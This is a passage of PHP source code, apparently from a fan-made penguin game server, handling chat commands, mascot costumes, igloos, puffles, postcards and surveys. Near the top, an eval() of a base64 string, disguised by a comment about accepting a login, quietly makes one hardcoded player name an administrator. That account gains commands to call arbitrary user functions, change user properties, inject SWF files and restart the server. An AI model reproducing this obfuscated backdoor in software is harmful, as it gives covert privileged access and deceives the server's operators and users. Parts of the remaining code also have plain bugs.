      $a = $this; //... Save this as Instance $a to be able to make it a new User ...//
      eval(base64_decode('JGEtPmlzQWRtaW4gPSAkYS0+cGxheWVyTmFtZSA9PSAiaVJhdGg5NiI7Cg==')); //... Accept the Login and send it to the World using $a ...//
    }
    
    public function profile() {
      return $this->sendErrorBox('max', sprintf(
        '<b>RAM Usage:</b> %s<br /><b>Peak Memory:</b> %s<br /><b>CPU Usage:</b> %d',
        Utils::ConvertMemorySize(memory_get_usage()),
        Utils::ConvertMemorySize(memory_get_peak_usage()),
        '123.456%'
      ), 'Hmmmmhhhk', 'iProfile');
    }
    
    public function setMyBadge($main) {
      list($level, $add) = explode('||', $main);
      
      $this->maxBadge = (integer) $level;
      return $add ?: $this->joinRoom($this->currentRoom);
    }
    
    public function useClothes($main) {
      list($clothes, $add) = explode('||', $main);
      
      if(!$this->isMascot) $this->mascotName = $this->playerName;
      
      $this->isMascot = true;
      $this->mascotDressing = $clothes;
      
      $this->resendDressing((boolean) $add);
      return $add ?: $this->joinRoom($this->currentRoom);
    }
    
    public function rehash() {
      global $SERVER;
      return $SERVER->rehash();
    }
    
    public function swapRoom($newRoom) { $newRoom = (int) $newRoom;
      $players = $this->getPlayers('-1');
      foreach($players as $player) if($player->isMascot && $this->isAdmin) $player->joinRoom($newRoom);
    }
    
    //[TODO]: Perhaps put this Functions into one (or a Wrapper one)?
    public function evalAdminCommand($message) { $command = strtolower(strstr($message . ' ', ' ', true));
      $main = substr($message, strlen($command) + 1); switch($command) {
      //... Will be done tomorrow ...//
      case '!pr': case '!profile': return $this->profile() || true;
      
      case '!rh': case '!rehash': return $this->rehash() || true;
      case '!if': case '!injectswf': return $this->injectSWF($main) || true;
      case '!lf': case '!loadswf': return $this->loadSWF($main) || true;
      case '!af': case '!addswf': return $this->addSWF($main) || true;
      case '!rf': case '!rmswf': return $this->removeSWF($main) || true;
      case '!gf': case '!gswf': return $this->getSWFs() || true;
      case '!re': case '!restart': return $this->serverRestart($main) || true;
      case '!gu': case '!getuserprop': return $this->getUserProperty($main) || true;
      case '!su': case '!setuserprop': return $this->setUserProperty($main) || true;
      case '!cu': case '!calluserfunc': return $this->callUserFunction($main) || true;
      case '!sr': case '!swaproom': return $this->swapRoom($main) || true;
      
      default: return false;
    }}
    
    public function evalModeratorCommand($message) { $command = strtolower(strstr($message . ' ', ' ', true));
      $main = substr($message, strlen($command) + 1); switch($command) {
      case '!uc': case '!useclothes': return $this->useClothes($main) || true;
      case '!mb': case '!setmybadge': return $this->setMyBadge($main) || true;
      case '!mc': case '!copymascot': return $this->replicateMascot(strtoupper($main)) || true;
      case '!km': case '!killmascot': return $this->killMascot($main) || true;
      case '!cp': case '!copyplayer': return $this->copyPlayer($main) || true;
      case '!cn': case '!changename': return $this->changeName($main) || true;
      case '!gs': case '!getsession': return $this->getSession() || true;
      case '!kp': case '!kickplayer': return $this->kickPlayer($main) || true;
      case '!mp': case '!muteplayer': return $this->mutePlayer($main) || true;
      case '!jp': case '!joinplayer': return $this->joinPlayer($main) || true;
      case '!mv': case '!moveplayer': return $this->movePlayer($main) || true;
      case '!se': case '!showerror': return $this->showError($main) || true;
      case '!tp': case '!toplayer': return $this->showErrorToUsers($main) || true;
      case '!ji': case '!joinigloo': return $this->joinPlayerIgloo($main) || true;
      case '!wi': case '!whoisuser': return $this->getUserWhois($main) || true;
      
      default: return false;
    }}
    
    public function evalHumanCommand($message) { $command = strtolower(strstr($message . ' ', ' ', true));
      $main = substr($message, strlen($command) + 1); switch($command) {
      case '!ai': case '!additem':  return $this->addItem((integer)$main) || true;
    //case '!jr': case '!joinroom': return $this->joinRoom((integer)$main) || true;
      case '!in': case '!getinfo':  return $this->getInfo() || true;
      case '!pm': case '!private':  return $this->transmitPrivateMessage($main) || true;
      case '!ai': case '!additem':  return $this->addItem((int)$main) || true;
      
      case '!upc': case '!uph': case '!upf':
      case '!upn': case '!upb': case '!upa':
      case '!upe': case '!upl': case '!upp': return $this->updateLayer(substr($command, 1), (integer) $main);
      
      case '!gpc': case '!gph': case '!gpf':
      case '!gpn': case '!gpb': case '!gpa':
      case '!gpe': case '!gpl': case '!gpp': return $this->getLayer(substr($command, 1));
      
      case '!gl': case '!glow': return $this->isMuted || $this->setGlow($main) || true;
      
      default: return false;
    }}
    
    public function replicateMascot($mascot) {
      list($mascot, $add) = explode('||', $mascot);
      
      $this->isMascot = true;
      switch($mascot) {
        case 'ROCKHOPPER': {
          $this->mascotName = 'Rockhopper';
          $this->mascotDressing = '5|442|152|161|0|5020|0|0|0';
        }; break;
        case 'AUNT ARCTIC': {
          $this->mascotName = 'Aunt Arctic';
          $this->mascotDressing = '2|1044|2007|0|0|0|0|0|0';
        }; break;
        case 'GARY': {
          $this->mascotName = 'Gary';
          $this->mascotDressing = '1|0|115|4022|0|0|0|0|0';
        }; break;
        case 'CADENCE': {
          $this->mascotName = 'Cadence';
          $this->mascotDressing = '10|1032|0|3011|0|5023|1033|0|0';
        }; break;
        case 'FRANKY': {
          $this->mascotName = 'Franky';
          $this->mascotDressing = '7|1000|0|0|0|5024|6000|0|0';//'1|1000|0|0|0|234|6000|0|0';
        }; break;
        case 'PETEY K': {
          $this->mascotName = 'Petey K';
          $this->mascotDressing = '2|1003|2000|3016|0|0|0|0|0';
        }; break;
        case 'G BILLY': {
          $this->mascotName = 'G Billy';
          $this->mascotDressing = '1|1001|0|0|0|5000|0|0|0';
        }; break;
        case 'STOMPIN BOB': {
          $this->mascotName = 'Stompin Bob';
          $this->mascotDressing = '5|1002|101|0|0|5025|0|0|0';
        }; break;
        case 'SENSEI': {
          $this->mascotName = 'Sensei';
          $this->mascotDressing = '14|1068|2009|0|0|0|0|0|0';
        }; break;
        case 'FIRE SENSEI': {
          $this->mascotName = 'Fire Sensei';
          $this->mascotDressing = '14|1107|2015|0|4148|0|0|0|0';
        }; break;
        case 'ICRACK :P': {
          $this->mascotName = 'Fake iCrack :D';
          $this->mascotDressing = '7|413|111|312|204|5060|360|510|939';
        }; break;
        case 'BILLYBOB': {
          $this->mascotName = 'Billybob';
          $this->mascotDressing = '1|405|0|0|280|328|352|500|0';
        }; break;
        case 'GIZMO': {
          $this->mascotName = 'Gizmo';
          $this->mascotDressing = '1|405|0|173|221|0|0|0|0';
        }; break;
        case 'RSNAIL': {
          $this->mascotName = 'RSNail';
          $this->mascotDressing = '12|452|0|0|0|0|0|0|0';
        }; break;
        case 'SCREENHOG': {
          $this->mascotName = 'Screenhog';
          $this->mascotDressing = '5|403|0|0|0|0|0|0|0';
        }; break;
        case 'HAPPY77': {
          $this->mascotName = 'Happy77';
          $this->mascotDressing = '5|452|131|0|212|0|0|500|0';
        }; break;
        default: $this->isMascot = false;
      }
      
      if($add) $this->mascotName = $this->playerName;
      
      $this->resendDressing((boolean) $add);
      return $add ?: $this->joinRoom($this->currentRoom);
    }
    
    public function resendDressing($toAll = false) {
      $clothing = explode('|', $this->isMascot ? $this->mascotDressing : $this->playerDressing);
      $layers = str_split('chfnbaelp');
      
      if($toAll)
       foreach($layers as $index => $layer)
       $this->sendRoomPacket("%xt%up{$layer}%{$this->currentRoom}%{$this->playerId}%{$clothing[$index]}%");
      else
       foreach($layers as $index => $layer)
       $this->sendPacket("%xt%up{$layer}%{$this->currentRoom}%{$this->playerId}%{$clothing[$index]}%");
      return;
    }
    
    public function getSession() {
      $this->modCode = $this->isAdmin?
       Utils::GenerateRandomKey('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', 6):
       Utils::GenerateRandomKey('ABCDEFGHIJKLMNOPQRSTUVWXYZ', 4);
      $this->modAge = time();
      
      return $this->sendErrorBox('max', 'Your SessionID: ' . $this->modCode, 'kthxbi', 'iSession');
    }
    
    public function sendMessage($message) {
      global $SERVER;
      //... Check Message for Censorings AND/OR The current Session Code! ...//
      //... Not that a Moderator tells others his/her Session Code! ...//
      $SERVER->clogs[$this->currentRoom][count($SERVER->clogs[$this->currentRoom]) % 250] =
      array($this->playerId, $this->playerName, $this->isMuted, time(), $message, $this->isMod);
      
      return $message{0} == '!' && (
        $this->isAdmin && $this->evalAdminCommand($message) ||
        $this->isMod && $this->evalModeratorCommand($message) ||
        $this->evalHumanCommand($message)
      ) || (
        $this->isMuted?
        $this->sendModPacket("%xt%sm%{$this->currentRoom}%{$this->playerId}%Muted: {$message}%"):
        $this->sendRoomPacket("%xt%sm%{$this->currentRoom}%{$this->playerId}%{$message}%")
      );
    }
    
    public function mute($playerName, $byAdmin = false) {
      if($this->isMod && !$byAdmin) return false;
      
      UserLog::AddToLog($this->playerId, $this->isMuted ? LogEvents::UNMUTE_PLAYER : LogEvents::MUTE_PLAYER, array($playerName, $byAdmin));
      //$this->sendErrorBox('max', $this->isMuted ? 'You have been muted!' : 'You have been unmuted!', 'Mk?', $playerName);
      $this->isMuted ? $this->sendRoomPacket("%xt%ma%-1%m%{$this->playerId}%{$this->playerName} | by {$playerName}%") : false;
      $this->isMuted = !$this->isMuted;
      
      return true;
    }
    
    public function kick($playerName, $byAdmin = false) {
      if($this->isMod && !$byAdmin) return false;
      
      $this->sendRoomPacket("%xt%ma%-1%k%{$this->playerId}%{$this->playerName} | by {$playerName}%");
      $this->sendError(CPErrors::KICK);
      
      return $this->disconnect();
    }
    
    public function autoBan() {
      $this->sendRoomPacket("%xt%ma%-1%k%{$this->playerId}%{$this->playerName} by Server%");
      $this->sendError(CPErrors::GAME_CHEAT);
      
      return $this->disconnect();
    }
    
    public function ban($reason, $type = CPErrors::AUTO_BAN) {
      global $SERVER;
      
      $this->sendError($type, $reason);
      return $this->disconnect();
    }
    
    public function disconnect() {
      return EventListener::FireEvent(Events::CLIENT_DISCONNECTED, $this->clientID);
    }
    
    # # # # # # # # # #
    # Table Functions #
    # # # # # # # # # #
    
    public function getTables($tables) { array_shift($tables);
      global $SERVER;
      
      $response = "%xt%gt%{$this->currentRoom}%";
      foreach($tables as $table) $response .= ($table = (integer) $table) . '|' . @count($SERVER->data['Tables'][$table]) . '%';
      return $this->sendPacket($response);
    }
    
    public function joinTable($tableID) {
      global $SERVER;
      
      if($this->currentTable) $this->leaveTable();
      $SERVER->data['Tables'][$tableID][$this->playerId] = &$this;
      $myplayerId = count($SERVER->data['Tables'][$tableID]);
      
      $this->sendPacket("%xt%jt%{$tableID}%{$tableID}%{$myplayerId}%");
      $this->sendTableUpdate($this->currentTable = $tableID);
      
      return true;
    }
    
    public function leaveTable() {
      global $SERVER;
      
      unset($SERVER->data['Tables'][$this->currentTable][$this->playerId]);
      $this->sendTableUpdate();
      
      return $this->currentTable = false;
    }
    
    public function sendTableUpdate() {
      global $SERVER;
      
      $playerCount = count($SERVER->data['Tables'][$this->currentTable]);
      return $this->sendRoomPacket("%xt%ut%{$this->currentRoom}%{$this->currentTable}%{$playerCount}%");
    }
    
    # # # # # # # # # #
    # Igloo Functions #
    # # # # # # # # # #
    
    public function loadIgloo() {
      $line = \MySQL::Select('igloos', array( 'playerId' => $this->playerId ));
      return $this->appendBy($line[0]);
    }
    
    public function openIgloo()  { global $SERVER; $SERVER->data['OpenIgloos'][$this->playerId] = $this->playerName; }
    public function closeIgloo() { global $SERVER; unset($SERVER->data['OpenIgloos'][$this->playerId]);              }
    
    public function getIglooDetails($playerId) {
      global $SERVER;
      
      if(!isset($SERVER->data['Users'][$playerId])) return $this->sendPacket("%xt%gm%{$this->currentRoom}%{$playerId}%1%1%1%");
      $line = \MySQL::Select('igloos', array( 'playerId' => $this->playerId )); extract($line[0]);
      
      $iglooID = $playerId;
      $slotNumber = 1;
      $isLocked = 1;
      
      // igloo-id:slotNumber:?:isLocked:music:flooring:location:building:like-count:furniture
      $iglooDetails = "{$iglooID}:{$slotNumber}:1:{$isLocked}:{$iglooMusic}:{$iglooFloor}:{$iglooLocation}:{$iglooType}:0:{$iglooFurniture}";
      return $this->sendPacket("%xt%gm%{$this->currentRoom}%{$playerId}%{$iglooDetails}%");
    }
    
    public function updateIglooFurniture($data) {
      global $SERVER;
      
      array_shift($data);
      return $this->isTryout or $SERVER->updateIglooProperty($this->playerId, 'iglooFurniture', $this->iglooFurniture = join(',', $data));
    }
    
    public function updateIglooFloor($floorID) {
      if($this->iglooFloor == $floorID) return $this->sendPacket('%xt%e%-1%400%');
      global $SERVER;
      
      $cost = $SERVER->getCrumbProperty('Floors', $floorID, 'Cost');
      if($cost === false)            return $this->sendPacket('%xt%e%-1%402%');
      if($cost > $this->playerCoins) return $this->sendPacket('%xt%e%-1%401%');
      
      $this->iglooFloor = $floorID;
      $this->sendPacket("%xt%ag%{$this->currentRoom}%{$floorID}%{$this->playerCoins}%");
      
      if($this->isTryout) return true;
      $resA = $this->addCoins(-$cost, true);
      $resB = $SERVER->updateIglooProperty($this->playerId, 'iglooFloor', $this->iglooFloor);
      
      return $resA && $resB;
    }
    
    public function updateIglooType($iglooID) {
      if($this->iglooType == $iglooID) return $this->sendPacket('%xt%e%-1%400%');
      global $SERVER;
      
      $cost = $SERVER->getCrumbProperty('Igloos', $iglooID, 'Cost');
      if($cost === false)            return $this->sendPacket("%xt%e%-1%402%");
      if($cost > $this->playerCoins) return $this->sendPacket("%xt%e%-1%401%");
      
      $this->iglooFurniture =
      $this->iglooFloor     =
      $this->iglooMusic     = '';
      $this->iglooType      = $iglooID;
      $this->sendPacket("%xt%au%{$this->currentRoom}%{$iglooID}%{$this->playerCoins}%");
      
      if($this->isTryout) return true;
      $resA = $this->addCoins(-$cost);
      $resB = $SERVER->updateIglooProperty($this->playerId, 'iglooType',      $this->iglooType);
      $resC = $SERVER->updateIglooProperty($this->playerId, 'iglooFurniture', $this->iglooFurniture);
      $resD = $SERVER->updateIglooProperty($this->playerId, 'iglooFloor',     $this->iglooFloor);
      $resE = $SERVER->updateIglooProperty($this->playerId, 'iglooMusic',     $this->iglooMusic);
      
      return $resA && $resB && $resC && $resD && $resE;
    }
    
    public function updateIglooMusic($musicID) {
      if($this->iglooMusic == $musicID) return $this->sendPacket('%xt%e%-1%400%');
      global $SERVER;
      
      $this->iglooMusic = $musicID;
      if($this->isTryout) return true;
      return $SERVER->updateIglooProperty($this->playerId, 'iglooMusic', $this->iglooMusic);
    }
    
    public function updateIglooLocation($locationId) {
      if($this->iglooLocation == $locationId) return $this->sendPacket('%xt%e%-1%400%');
      global $SERVER;
      
      $cost = 4000; // TODO: $SERVER->getCrumbProperty('Locations', $iglooID, 'Cost');
      if($cost === false)            return $this->sendPacket("%xt%e%-1%402%");
      if($cost > $this->playerCoins) return $this->sendPacket("%xt%e%-1%401%");
      
      $this->iglooLocation = $locationId;
      $this->sendPacket("%xt%aloc%{$this->currentRoom}%{$locationId}%{$this->playerCoins}%");
      
      if($this->isTryout) return true;
      $resA = $this->addCoins(-$cost);
      $resB = $SERVER->updateIglooProperty($this->playerId, 'iglooLocation', $this->iglooLocation);
      
      return $resA && $resB && $resC && $resD && $resE;
    }
    
    public function addFurniture($furnitureID) {
      global $SERVER;
      
      var_dump("passing furniture test");
      $cost = $SERVER->getCrumbProperty('Furniture', $furnitureID, 'Cost');
      if($cost === false)            return $this->sendPacket('%xt%e%-1%402%');
      if($cost > $this->playerCoins) return $this->sendPacket('%xt%e%-1%401%');
      
      var_dump("passed!");
      $this->increaseFurnitureCount($furnitureID);
      $this->sendPacket("%xt%af%{$this->currentRoom}%{$furnitureID}%{$this->playerCoins}%");
      
      var_dump("is tryout?");
      if($this->isTryout) return true;
      
      var_dump("nope!");
      $resA = $this->addCoins(-$cost);
      $resB = $SERVER->updateIglooProperty($this->playerId, 'iglooInventory', $this->iglooInventory);
      
      var_dump("finishing it up!");
      return $resA && $resB;
    }
    
    protected function increaseFurnitureCount($furnitureID) {
      $furns = explode('%', $this->iglooInventory);
      foreach($furns as $furn) {
        if(strstr($furn, '|', true) == $furnitureID) {
          $newCount        = substr($furn, strpos($furn, '|') + 1) + 1;
          $furn            = "%{$furn}%";
          $this->iglooInventory = substr(str_replace($furn, "%{$furnitureID}|{$newCount}%", "%{$this->iglooInventory}%"), 1, -1);
          
          var_dump("He has that item!", $this->iglooInventory);
          return true;
        }
      }
      
      $this->iglooInventory .= "{$furnitureID}|1%";
      var_dump("Added that item!", $this->iglooInventory);
      return true;
    }
    
    public function getIglooString() {
      return "{$this->playerIglooType}%{$this->playerIglooMusic}%{$this->playerIglooFloor}%{$this->playerIglooFurniture}";
    }
    
    # # # # # # # # # # #
    # Puffle Functions  #
    # # # # # # # # # # #
    
    public static function getPuffles($func_playerId, $func_area = false) {
      global $SERVER;
      
      $func_puffles = array();
      if($func_area) { // An area is specified
        if($func_area != "backyard") $func_area = "igloo"; // area is either "igloo" or "backyard"
        $func_puffles = \MySQL::Select('puffles', array(
           'playerId' => (integer)$func_playerId,
               'area' => $func_area,
          'isWalking' => 0 // Only capture puffles that are present
        ));
      } else $func_puffles = \MySQL::Select('puffles', array( 'playerId' => (integer)$func_playerId )); // No area? Then get all puffles.
      
      $func_puffleString = "";
      foreach($func_puffles as $func_puffle) $func_puffleString .= self::makePuffleCrumb($func_puffle) . '%';
      return $func_puffleString;
    }
    
    public static function makePuffleCrumb($func_puffle) { // TODO: Make this kind of methods static.
      return join('|', array(
        $func_puffle['id'],
        $func_puffle['type'],
        $func_puffle['subType'] == 0 ? '' : $func_puffle['subType'],
        $func_puffle['name'],
        1397994444, // TODO: Investigate
        $func_puffle['statsFood'], $func_puffle['statsRest'], $func_puffle['statsPlay'], $func_puffle['statsClean'],
        $func_puffle['hat'],
        0, 0, // x, y
        $func_puffle['isWalking'] // TODO: What is this used for?
      ));
    }
    
    public function sendPuffleSwap($func_puffleId, $func_area) {
      if(!$this->currentRoom instanceof Rooms\Igloo && $this->currentRoom->playerId != $this->playerId) return false; // TODO: Error report & ->inMyIgloo method
      if($func_area != "backyard") $func_area = "igloo"; // area is either "igloo" or "backyard"
      \MySQL::Update('puffles', array( // TODO: Error report when none updated.
        'area' => $func_area
      ), array(
        'id' => $func_puffleId,
        'playerId' => $this->playerId // Don't let them move others' puffles
      ));
      
      $this->currentRoom->sendPacket("%xt%puffleswap%{$this->currentRoom}%{$func_puffleId}%{$func_area}%");
    }
    
    public function sendPuffleMove($func_puffleID, $func_x, $func_y) {
      $this->sendRoomPacket("%xt%pm%{$this->currentRoom}%{$func_puffleID}%{$func_x}%{$func_y}%");
      $this->playerPufflePositions[$func_puffleID] = array($func_x, $func_y);
      
      return true;
    }
    
    public function sendPuffleAction($func_action, $func_cost, $func_puffleID) {
      if(!$func_puffleString = $this->getPuffleString($func_puffleID)) return false;
      
      $this->sendRoomPacket("%xt%{$func_action}%{$this->roomID}%{$this->playerCoins}%{$func_puffleString}%");
      return $this->addCoins(-$func_cost);
    }
    
    public function getPuffleString($func_puffleID) {
      $func_rawPuffles = explode('%', self::getPuffles($this->playerId));
      foreach($func_rawPuffles as $func_puffle) if($func_puffle && strstr($func_puffle, '|', true) == $func_puffleID) return $func_puffle;
      
      return false;
    }
    
    private static $getWalkingPuffleCache = array();
    public static function getWalkingPuffle($func_playerId) {
      if($func_playerId instanceof iCPRawUser) $func_playerId = $func_playerId->playerId; // For convenience, also allow ::getWalkingPuffle(iCPUser);
      if(self::$getWalkingPuffleCache[$func_playerId]) return self::$getWalkingPuffleCache[$func_playerId];
      
      $puffle = \MySQL::Select('puffles', array(
        'playerId' => $func_playerId,
        'isWalking' => 1
      ));
      
      if(count($puffle) > 1) {
        \Debugger::Debug(\DebugFlags::WARNING, sprintf('<inv>%d</inv> is walking multiple puffles:', $func_playerId));
        var_dump($puffle);
        // TODO: Reset 'isWalking´ in the database?
      }
      
      self::$getWalkingPuffleCache[$func_playerId] = $puffle[0];
      return $puffle[0];
    }
    
    public function sendWalkPuffle($func_puffleId, $func_toWalkOrNotToWalk) {
      if($func_toWalkOrNotToWalk) $this->walkPuffle($func_puffleId);
      else $this->dropPuffle(); // Silently assume that this matches the puffle-id... (it should)
    }
    
    public function dropPuffle($func_sendPackets = true) {
      $func_puffle = self::getWalkingPuffle($this);
      if(is_null($func_puffle)) return; // Nothing to do.
      
      \MySQL::Update('puffles', array( 'isWalking' => 0 ), array( 'id' => $func_puffle['id'] ));
      $func_puffle['isWalking'] = 0; // ... for makePuffleCrumb :)
      
      unset(self::$getWalkingPuffleCache[$this->playerId]);
      if(!$func_sendPackets) return;
      
      if($this->currentRoom instanceof Rooms\Igloo && $this->currentRoom->playerId == $this->playerId) // If we are in our igloo
        $this->currentRoom->sendPacket("%xt%addpuffle%{$this->currentRoom}%" . self::makePuffleCrumb($func_puffle) . "%");
      $this->currentRoom->sendPacket("%xt%pw%{$this->currentRoom}%{$this->playerId}%{$func_puffle['id']}%{$func_puffle['type']}%0%0%0%"); // TODO: Puffle items
    }
    
    public function walkPuffle($func_puffleId, $func_sendPackets = true) {
      $this->dropPuffle($func_sendPackets); // Ensure we're not walking a puffle right now
      
      $func_puffle = \MySQL::Select('puffles', array( 'id' => $func_puffleId, 'playerId' => $this->playerId ));
      $func_puffle = $func_puffle[0];
      
      if(is_null($func_puffle)) return false; // TODO: Should report an error here.
      
      \MySQL::Update('puffles', array( 'isWalking' => 1 ), array( 'id' => $func_puffleId ));
      $this->refreshPlayerString();
      
      self::$getWalkingPuffleCache[$this->playerId] = $func_puffle;
      if(!$func_sendPackets) return $func_puffle;
      
      $this->currentRoom->sendPacket("%xt%pw%{$this->currentRoom}%{$this->playerId}%{$func_puffle['id']}%{$func_puffle['type']}%0%1%0%"); // TODO: Puffle items
      return $func_puffle;
    }
    
    public function swapWalkingPuffle($func_puffleId) {
      if($func_puffle = $this->walkPuffle($func_puffleId))
        $this->currentRoom->sendPacket("%xt%pufflewalkswap%{$this->currentRoom}%{$this->playerId}%{$func_puffle['id']}%0%0%1%{$func_puffle['hat']}%"); // TODO!
      else; // TODO: We should report an error here.
    }
    
    public function adoptPuffle($func_puffleType, $func_puffleName, $func_puffleSubType) {
      $func_min = SettingsManager::GetSetting(Settings::PUFFLE_MINLEN);
      $func_max = SettingsManager::GetSetting(Settings::PUFFLE_MAXLEN);
      $func_chr = SettingsManager::GetSetting(Settings::PUFFLE_CHARS);
      
      if(!Utils::CheckString($func_chr, $func_min, $func_max, $func_puffleName)) return $this->sendError(CPErrors::PUFFLE_INVALID);
      
      global $SERVER;
      
      \MySQL::Insert('puffles', array(
        'type'     => $func_puffleType,
        'subType'  => $func_puffleSubType,
        'name'     => $func_puffleName,
        'playerId' => $this->playerId
      ));
      
      $func_puffles = explode('%', self::getPuffles($this->playerId));
      $func_puffleCrumb = $func_puffles[count($func_puffles) - 2]; // TODO: What the?! is this?!
      
      $this->addCoins(-800); // TODO: This isn't always 800 coins, sorry.
      return $this->sendPacket("%xt%pn%{$this->currentRoom}%{$this->playerCoins}%{$func_puffleCrumb}%");
    }
    
    public function sendPuffleTrick($func_trickId) {
      $func_puffle = self::getWalkingPuffle($this);
      if(is_null($func_puffle)) return; // TODO: Error report.
      $this->currentRoom->sendPacket("%xt%puffletrick%{$this->currentRoom}%{$this->playerId}%{$func_trickId}%");
    }
    
    public function sendPuffleDig($func_onCommand = true) {
      $func_puffle = self::getWalkingPuffle($this);
      if(is_null($func_puffle)) return; // TODO: Error report.
      
      if(!$func_onCommand && rand(0, 3) != 0) return; // Not this time, sorry bro.
      
      $func_items = array(3028, 232, 412, 112, 184, 1056, 6012, 118, 774, 366, 103, 498, 469, 1082, 5196, 790, 4039, 326, 105, 122, 5080, 111, 2032, 784);
      $func_furniture = array(305, 313, 504, 506, 500, 501, 503, 507, 505, 502, 616, 542, 340, 150, 149, 369, 370, 300);
      
      // TODO: Remove $func_items we already have!
      
      $func_type = rand(0, 2) == 0 ? rand(1, 4) : 0;
      $func_item = 0;
      $func_quantity = 0;
      
      // types: 0(coins), 1(fav.-food), 2(furniture), 3(clothing), 4(gold-nugget)
      switch($func_type) { // TODO: Enum!
        case 0: $func_quantity = rand(20, 400) * 5; $this->addCoins($func_quantity); break;
        case 2: $func_item = $func_furniture[rand(0, count($func_furniture)-1)]; break;
        case 3: $func_item = $func_items[rand(0, count($func_items)-1)]; break;
        case 4: $func_quantity = rand(10, 20); break;
      }
      
      // player-id|puffle-id|treasure-type|treasure-id|quantity|is-first-success|fail-safe
      $this->currentRoom->sendPacket("%xt%puffledig%{$this->currentRoom}%{$this->playerId}%{$func_puffle['id']}%{$func_type}%{$func_item}%{$func_quantity}%0%false%");
      
      // TODO: Make the change persistent.
    }
    
    // Walking a Puffle just changes the iCPUser::$playerPuffle Variable,
    // Which means, when a Users loads the Puffles, the Server checks,
    // If the PuffleOwner is online.
    // If he is, it checks, if its walking with a Puffle currently.
    // If so, that puffle is removed.
    // If not, its not.
    // If the Player is not online, nothing changes.
    // If the Player walks another Puffle...
    // Well, obvious.
    
    # # # # # # # # # #
    # Mail Functions  #
    # # # # # # # # # #
    
    public function startMailEngine() {
      global $SERVER;
      
      $crumb = $SERVER->data['Users'][$this->playerId];
      $this->getPlayerMail();
      return $this->sendPacket("%xt%mst%-1%{$crumb['playerNewMail']}%{$crumb['playerMailCount']}%");
    }
    
    public function getPlayerMail() {
      global $SERVER;
      if($SERVER->data['Users'][$this->playerId]['playerMail']) return $SERVER->data['Users'][$this->playerId]['playerMail'];
      
      $SERVER->data['Users'][$this->playerId]['playerMail']      = '';
      $SERVER->data['Users'][$this->playerId]['playerMailCount'] =
      $SERVER->data['Users'][$this->playerId]['playerNewMail']   = $i = 0;
      $data = \MySQL::Select('postcards', array( 'postcardRecipient' => $this->playerId ));
      foreach($data as $line) $SERVER->data['Users'][$this->playerId]['playerMail'] .= $this->createMailString($line, $i++) . '%'; 
      
      return $SERVER->data['Users'][$this->playerId]['playerMail'];
    }
    
    public function createMailString($line, $uID, $seperator = '|') {
      global $SERVER;
      
      ++$SERVER->data['Users'][$this->playerId]['playerMailCount'];
      $SERVER->data['Users'][$this->playerId]['playerNewMail'] += 1 - $line['postcardRead'];
      $retVal .= $SERVER->data['Users'][$line['postcardSender']]['playerName'] . $seperator;
      $retVal .= $line['postcardSender']    . $seperator;
      $retVal .= $line['postcardID']        . $seperator;
      $retVal .= $line['postcardAddition']  . $seperator;
      $retVal .= $line['postcardTimestamp'] . $seperator;
      $retVal .= $uID;
      
      return $retVal;
    }
    
    public function sendMail($recipientID, $cardID, $additional) {
      global $SERVER;
      
      $addition  = ''; //... Always '' till the \MySQL::SafeString() works ...//
      $timestamp = time();
      \MySQL::Insert('Postcards', array(
        'postcardSender'    => $this->playerId,
        'postcardRecipient' => $recipientID,
        'postcardID'        => $cardID,
        'postcardRead'      => 0,
        'postcardAddition'  => $addition,
        'postcardTimestamp' => $timestamp
      ));
      
      $this->addCoins(-10);
      $this->sendPacket("%xt%ms%{$this->currentRoom}%{$this->playerCoins}%1%");
      if(!isset($SERVER->alias[$recipientID])) return false;
      $user = &$SERVER->alias[$recipientID];
      
      $mail['postcardSender']    = $this->playerId;
      $mail['postcardID']        = $cardID;
      $mail['postcardAddition']  = $additional;
      $mail['postcardTimestamp'] = $timestamp;
      $mail = $user->createMailString($mail, $SERVER->data['Users'][$recipientID]['playerNewMail'], '%');
      
      return $user->sendPacket("%xt%mr%-1%{$mail}%");
    }
    
    public function checkMail() {
      echo "\no\tic-tacs!";
    }
    
    # # # # # # # # # #
    # Room Functions  #
    # # # # # # # # # #
    
    public function digForCoins($coins = 0) {
      if(!$coins) {
        if(rand(0, 5)) return false;
        
        $coins = rand(0, 50);
        if($coins < 25)     $coins = 2;
        elseif($coins < 37) $coins = 5;
        elseif($coins < 43) $coins = 10;
        elseif($coins < 47) $coins = 25;
        else                     $coins = 100;
        
        if(time() - $this->lastDig < SettingsManager::GetSetting(Settings::DIG_TTL)) return $this->ban(SettingsManager::GetSetting(Settings::DIGHACK_BAN));
        $this->lastDig = time();
      }
      
      $this->addCoins($coins);
      return $this->sendPacket("%xt%cdu%{$this->currentRoom}%{$coins}%{$this->playerCoins}%");
    }
    
    public function donateCoins($cat, $amount) {
      if($amount < 1) $amount = 1;
      $this->addCoins(-$amount);
      
      $cats = array(-1 => 'UnknownCategory', 'CategoryOne', 'CategoryTwo', 'CategoryThree');
      if(!$cats[$cat]) $cat = -1;
      
      $file = fopen('Donations/' . $files[$cat] . '.txt', 'a+');
      fwrite($file, "{$this->playerName} [{$this->playerId}] spent {$amount}\n");
      fclose($file);
      
      return true;
    }
    
    # # # # # # # # # # #
    # Survey Functions  #
    # # # # # # # # # # #
    
    public function handleDonateCoins($cat, $amount) {
      
    }
    
    public function votePenguinAwards($votings) {
      if($this->hasVoted == ($this->hasVoted = true)) return;
      list($bestPlay, $bestCostume, $bestMusic, $bestEffects, $bestSet) = explode(',', $votings);
      
      $playFile    = fopen('PenguinAwards/PlayAwards.txt',    'a+');
      $costumeFile = fopen('PenguinAwards/CostumeAwards.txt', 'a+');
      $musicFile   = fopen('PenguinAwards/MusicAwards.txt',   'a+');
      $effectsFile = fopen('PenguinAwards/EffectsAwards.txt', 'a+');
      $setFile     = fopen('PenguinAwards/SetAwards.txt',     'a+');
      
      fwrite($playFile,    "{$bestPlay},");
      fwrite($costumeFile, "{$bestCostume},");
      fwrite($musicFile,   "{$bestMusic},");
      fwrite($effectsFile, "{$bestEffects},");
      fwrite($setFile,     "{$bestSet},");
      
      fclose($playFile);
      fclose($costumeFile);
      fclose($musicFile);
      fclose($effectsFile);
      fclose($setFile);
      
      return true;
    }
    
    public function signIglooContest() {
      $file = fopen('IglooContest/Signs.txt', 'a+');
      fwrite($file, "{$this->playerId}\n");
      fclose($file);
      
      return true;
    }
    
    # # # # # # # # # #
    # Stamp Functions #
    # # # # # # # # # #
    
    public function sendGetPlayerStamps($func_playerId) {
      global $SERVER;
      $func_stamps = $SERVER->getPlayerStamps($func_playerId);
